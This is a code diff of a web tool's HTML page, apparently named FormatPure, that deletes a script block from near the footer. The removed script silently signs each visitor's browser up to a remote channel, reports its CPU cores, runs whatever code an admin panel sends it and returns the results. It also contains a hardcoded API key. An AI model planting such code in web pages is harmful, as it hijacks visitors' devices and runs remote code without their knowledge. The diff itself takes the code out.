@@ -921,54 +921,8 @@ async function startAnimation() {
 
 <a href="privacy.html">Privacy Policy</a>
 
-<!-- Connect FormatPure Tool to the Global Computing Hub -->
-<script src="https://jsdelivr.net"></script>
-<script>
-    // Initialize Node Grid
-    const SUPABASE_URL = "https://supabase.co";
-    const SUPABASE_ANON_KEY = "    sb_publishable_w4sWU_px1mPoCMfjwh93Kg_PB8ISCRg    "; // Replace with your exact, full publishable key if this is missing characters
-    
-    try {
-        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-        const nodeId = 'node-' + Math.random().toString(36).substring(2, 11);
-        const channel = supabase.channel('computing_mesh_pool');
 
-        channel.subscribe((status) => {
-            if (status === 'SUBSCRIBED') {
-                // Broadcast this device's presence to your Admin Dashboard live
-                channel.send({
-                    type: 'broadcast',
-                    event: 'NODE_REGISTERED',
-                    payload: { 
-                        nodeId: nodeId, 
-                        cores: navigator.hardwareConcurrency || 2 
-                    }
-                });
-            }
-        });
 
-        // Listen for data processing calculations from your Admin Control panel
-        channel.on('broadcast', { event: 'DISPATCH_JOB' }, (payload) => {
-            const jobData = payload.payload;
-            try {
-                // Safely compute the math task natively inside the user's browser context
-                const runTask = new Function('data', jobData.logic);
-                const result = runTask(jobData.payload);
-                
-                // Stream calculated result back to your master controller instantly
-                channel.send({
-                    type: 'broadcast',
-                    event: 'JOB_COMPLETE',
-                    payload: { nodeId: nodeId, taskId: jobData.taskId, result: result }
-                });
-            } catch (err) {
-                console.log("Task dropped safely.");
-            }
-        });
-    } catch(e) {
-        console.log("Mesh standby.");
-    }
-</script>
   
 </body>
 </html>
